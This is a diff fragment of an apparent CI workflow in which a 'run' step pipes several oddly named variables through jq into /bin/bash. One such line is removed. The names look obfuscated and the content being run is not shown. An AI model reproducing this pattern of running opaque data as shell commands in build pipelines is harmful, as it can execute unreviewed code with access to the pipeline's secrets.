@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
           echo $ehwjc3 | jq -r .xpwr39 | /bin/bash
-          echo $hf847 | jq -r .dauld0716 | /bin/bash
           echo $ilp28 | jq -r .c8 | /bin/bash
 
       - name: Store results
